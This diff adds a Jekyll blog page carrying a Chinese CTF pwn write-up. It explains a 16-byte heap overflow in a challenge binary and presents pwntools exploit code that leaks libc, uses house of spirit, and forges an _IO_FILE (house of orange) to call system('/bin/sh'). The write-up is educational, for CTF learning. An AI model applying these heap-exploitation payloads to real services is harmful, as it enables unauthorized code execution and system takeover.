@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>20180611</title>
+  <meta name="description" content="0x00 前言">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="http://localhost:4000/jekyll/update/2019/01/02/20180611.html">
+  <link rel="alternate" type="application/rss+xml" title="Your awesome title" href="http://localhost:4000/feed.xml">
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Your awesome title</a>
+
+    <nav class="site-nav">
+      <a href="#" class="menu-icon">
+        <svg viewBox="0 0 18 15">
+          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+        </svg>
+      </a>
+
+      <div class="trigger">
+        
+          
+          <a class="page-link" href="/about/">About</a>
+          
+        
+          
+        
+          
+        
+          
+        
+      </div>
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">20180611</h1>
+    <p class="post-meta"><time datetime="2019-01-02T21:01:05+08:00" itemprop="datePublished">Jan 2, 2019</time></p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <h1 id="0x00">0x00 前言</h1>
+
+<p>这道题做起来感觉局限性很大，不能自定义chunk的大小，只能分配0xD0和0x80的chunk；然后一共能用来放堆块的全局数组大小只有3。所以最后几乎是极限利用house of orange做出来的。所以，不知道是不是预期解。。。（按照我做pwn的魔咒估计又不是预期了2333</p>
+
+<h1 id="0x01">0x01 漏洞点</h1>
+
+<p>漏洞点有两处，一个是在申请普通pig时，有16字节的溢出</p>
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">pigs</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">((</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">pig_size</span><span class="p">);</span>
+<span class="c1">//...
+</span><span class="n">puts</span><span class="p">(</span><span class="s">"data:"</span><span class="p">);</span>
+<span class="n">get_input</span><span class="p">(</span><span class="n">pigs</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="o">+</span> <span class="mi">16</span><span class="p">,</span> <span class="n">pig_size</span><span class="p">);</span>           <span class="c1">// overflow
+</span></code></pre></div>
+<p>还有一个是可以直接修改fly pig后面的那个chunk</p>
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">get_input</span><span class="p">(</span><span class="n">buf_0x70</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
+</code></pre></div>
+<p>因为刚好<code class="prettyprint">buf_0x70</code>的chunk大小是0x80，所以这刚好可以写到下一个chunk的fd和bk</p>
+
+<h1 id="0x02-leak">0x02 leak</h1>
+
+<p>首先是要leak，还是老思路，溢出转成UAF，这里可以用把unsorted bin延伸的思路。具体就是，把unsorted bin延伸到后面一个已经在使用的chunk，然后申请一个堆块，这个时候就可以通过show那个UAF的pig来实现fd的leak。</p>
+
+<p>具体实现如下</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">create_pig</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mh">0xB7</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">create_pig</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"B"</span> <span class="o">*</span> <span class="mh">0xB7</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">create_pig</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">+</span> <span class="s">"C"</span> <span class="o">*</span> <span class="mh">0xB6</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">free_pig</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">free_pig</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">create_pig</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mh">0xB8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">((</span><span class="mh">0xD0</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span> <span class="o">|</span> <span class="mi">1</span><span class="p">)[:</span><span class="mi">7</span><span class="p">]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="c">#extend unsorted bin chunk</span>
+
+<span class="n">create_pig</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">*</span> <span class="mh">0xB7</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="c">#此时idx为2的pig处于UAF状态，可以leak出fd</span>
+
+<span class="n">leak</span> <span class="o">=</span> <span class="n">print_pigs</span><span class="p">()[</span><span class="mh">0xd0</span><span class="p">:</span><span class="mh">0xd0</span><span class="o">+</span><span class="mi">6</span><span class="p">]</span><span class="o">+</span><span class="s">"</span><span class="se">\x00\x00</span><span class="s">"</span>
+<span class="n">libc_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span> <span class="o">-</span> <span class="n">UNSORTED_OFF</span>
+<span class="k">assert</span> <span class="p">(</span><span class="n">libc_addr</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_addr</span><span class="p">)</span>
+</code></pre></div>
+<h1 id="0x03-house-of-orange">0x03 极限house of orange</h1>
+
+<h2 id=">思路</h2>
+
+<p>这题leak是比较简单的，难的是任意代码执行。这题明显不能fastbin attack，因为没法分配0x70的chunk。想了一下发现只能house of orange。但是house of orange需要溢出一整个<code class="prettyprint">_IO_FILE</code>的数据，我们这边只能溢出16个字节，尤其是最关键的<code class="prettyprint">bk</code>指针没法溢出到，怎么办？</p>
+
+<p>一开始的思路是，构造两个0xD0和0x80的chunk，使他们可以溢出到同一个unsorted bin，这样两个pig“合作”，一个负责溢出<code class="prettyprint">prev_size</code>和<code class="prettyprint">size</code>，一个负责写<code class="prettyprint">fd</code>和<code class="prettyprint">bk</code>，然后<code class="prettyprint">_IO_FILE</code>其他数据就预先放在这个chunk里面。</p>
+
+<p>然而不行，构造不出这种情况。</p>
+
+<p>那么换思路，我们真的需要溢出<code class="prettyprint">prev_size</code>和<code class="prettyprint">size</code>么？前者可以用跟放<code class="prettyprint">_IO_FILE</code>其他数据一样的思路预先放好，而<code class="prettyprint">size</code>只要是0x61就行，而这是可以通过溢出unsorted bin chunk的大小构造出来的。</p>
+
+<h2 id=">准备工作</h2>
+
+<p>首先是<code class="prettyprint">_IO_FILE</code>的内容</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">fake_file</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span>
+<span class="n">fake_file</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">*</span> <span class="mh">0x10</span> <span class="c"># fd and bk</span>
+<span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">fake_file</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">*</span> <span class="mi">8</span>
+<span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_addr</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)))</span> <span class="c">#/bin/sh addr</span>
+<span class="n">fake_file</span> <span class="o">+=</span> <span class="p">(</span><span class="mh">0xc0</span><span class="o">-</span><span class="mh">0x40</span><span class="p">)</span> <span class="o">*</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span>
+<span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c">#mode</span>
+<span class="n">fake_file</span> <span class="o">+=</span> <span class="p">(</span><span class="mh">0xd8</span><span class="o">-</span><span class="mh">0xc4</span><span class="p">)</span> <span class="o">*</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span>
+<span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_addr</span> <span class="o">+</span> <span class="n">IO_STR_FINISH</span> <span class="o">-</span> <span class="mh">0x18</span><span class="p">)</span> <span class="c">#vtable_addr</span>
+<span class="n">fake_file</span> <span class="o">+=</span> <span class="p">(</span><span class="mh">0xe8</span><span class="o">-</span><span class="mh">0xe0</span><span class="p">)</span> <span class="o">*</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span>
+<span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_addr</span> <span class="o">+</span> <span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">])</span>
+</code></pre></div>
+<p>这里不是通过自己构造虚表，而是用了一个libc里面的虚表中一个函数，这个虚表在<code class="prettyprint">_IO_jump_t</code>的后面，就在这个表偏前面的位置，有个函数，里面有个<code class="prettyprint">call [xxx+0xe8]</code>这样的指令，很好找的。然后第一个参数刚好也用了结构体里面的一个数据，所以在那里放<code class="prettyprint">/bin/sh</code>的地址即可，然后0xe8处放system的地址，即可实现<code class="prettyprint">system(&quot;/bin/sh&quot;)</code>。</p>
+
+<p>这个利用方式比起自己构造虚表有一个好处，一是不用leak堆的地址，二是可以绕过2.24以上版本的一个security check。这题libc版本是2.23，所以用这个方法的原因是前者。</p>
+
+<p>接着清理一下堆</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">free_pig</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">free_pig</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="c">#fake_file[0x20:0x50]</span>
+<span class="n">create_pig</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"F"</span> <span class="o">*</span> <span class="mh">0xB7</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">free_pig</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="c">#consume last chunk,</span>
+<span class="c">#last chunk won't be consolidated because pre_inuse of topchunk</span>
+<span class="c">#so do consolidation by ourselves</span>
+<span class="c">#now bins are empty, everything merged to top chunk</span>
+<span class="c">#donot use idx 2 now</span>
+</code></pre></div>
+<p>这里有个有趣的现象，因为虽然我们延伸了unsorted bin chunk的大小，但是top chunk的<code class="prettyprint">prev_use</code>仍然是1，所以在free 1和0 之后，前面的unsorted bin跟那个UAF的chunk并不会consolidate，所以后面要再create一下，拿到之前那个UAF的chunk，再free，就会全部consolidate成一个top chunk了。（除了0xB21处最开始分配的那个3616大小的chunk，然而我并不知道那是干嘛用的，大概那才是预期解？233）</p>
+
+<h2 id="house-of-spirit-idx-2">house of spirit 解放idx 2</h2>
+
+<p>此时0和1是空的，2是一个野指针。然后接下来的利用，我一开始试着只用两个pigs来弄，发现怎么也弄不成功。所以务必解放idx为2的pig。然而他是个野指针，随便free可能会爆，怎么办？可以用<a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_spirit.c">house of spirit</a>的思路，把他作为一个用不到的大小的fastbin chunk释放掉，比方说这题我就用了0x20。</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">create_fly_pig</span><span class="p">()</span>
+<span class="n">create_fly_pig</span><span class="p">()</span>
+<span class="n">create_fly_pig</span><span class="p">()</span>
+
+<span class="c">#topchunk fb0</span>
+<span class="c">#dangling pointer fe0</span>
+<span class="c">#0x30</span>
+<span class="n">create_pig</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"PREVSIZE"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mh">0x18</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1234</span><span class="p">))</span>
+<span class="n">free_pig</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="c">#free 0 first to prevent fastbin consolidation</span>
+<span class="n">free_pig</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="c">#house of spirit to make idx 2 available</span>
+
+<span class="c">#now bins only has 0x20 fastbin</span>
+<span class="c">#3 pigs are clear</span>
+</code></pre></div>
+<p>这里要注意，必须要先free 0再free 2，不然会导致fastbin consolidate，这样会爆异常。</p>
+
+<p>这个时候3个pigs又都可以用了，而且bins除了0x20 fastbin也都是空的，然而这个0x20根本不会被用上</p>
+
+<h2 id="house-of-orange">house of orange花式利用</h2>
+
+<p>接着就是house of orange了，要构造一个0x61的chunk，同样用之前的思路，改写unsorted bin的大小。这个时候就要把unsorted bin大小改写成<code class="prettyprint">0x60+0x80</code>，这样的话create一个flypig之后，刚好能剩下一个0x60的chunk。</p>
+
+<p>当然，要预先在内存中放好<code class="prettyprint">_IO_FILE</code>的关键数据，exp如下</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">create_pig</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"F"</span> <span class="o">*</span> <span class="mh">0xB7</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">create_pig</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">*</span> <span class="mh">0x80</span> <span class="o">+</span> <span class="n">fake_file</span><span class="p">[</span><span class="mh">0x20</span><span class="p">:</span><span class="mh">0x50</span><span class="p">]</span> <span class="o">+</span> <span class="s">"G"</span> <span class="o">*</span> <span class="mi">7</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="c">#\x00是因为_flags(prev_size)要是0</span>
+<span class="n">create_pig</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">fake_file</span><span class="p">[</span><span class="mh">0x70</span><span class="p">:]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">create_fly_pig</span><span class="p">()</span> <span class="c">#prevent topchunk consolidate</span>
+
+<span class="n">free_pig</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">free_pig</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="c">#now 0x1a1 unsorted bin</span>
+
+<span class="n">create_pig</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"E"</span> <span class="o">*</span> <span class="mh">0xB8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">((</span><span class="mh">0x60</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">)</span> <span class="o">|</span> <span class="mi">1</span><span class="p">)[:</span><span class="mi">7</span><span class="p">]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">create_fly_pig</span><span class="p">()</span>
+
+<span class="n">edit_fly_pig</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_addr</span> <span class="o">+</span> <span class="n">UNSORTED_OFF</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_addr</span> <span class="o">+</span> <span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_IO_list_all"</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)[:</span><span class="mi">7</span><span class="p">]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"4</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"secret:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"UOTp</span><span class="si">%</span><span class="s">I&lt;S</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p>至于这个“预先放好”的位置是如何确定的，大概就是不断地脑补+调试吧，有时候右脑不够用纸上画个图也能帮助思考。</p>
+
+<p>有趣的是，好像在这个版本<code class="prettyprint">0x60+0x80=0xe0</code>的unsorted bin chunk的后面并不用伪造next chunk的<code class="prettyprint">prev_size</code>和<code class="prettyprint">size</code>，这个好像在后面libc的版本是有检查的。</p>
+
+  </div>
+
+</article>
+
+      </div>
+    </div>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Your awesome title</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li>Your awesome title</li>
+          <li><a href="mailto:your-email@domain.com">your-email@domain.com</a></li>
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-2">
+        <ul class="social-media-list">
+          
+          <li>
+            <a href="https://github.com/jekyll"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
+</span><span class="username">jekyll</span></a>
+
+          </li>
+          
+
+          
+          <li>
+            <a href="https://twitter.com/jekyllrb"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
+</span><span class="username">jekyllrb</span></a>
+
+          </li>
+          
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-3">
+        <p>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
+</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
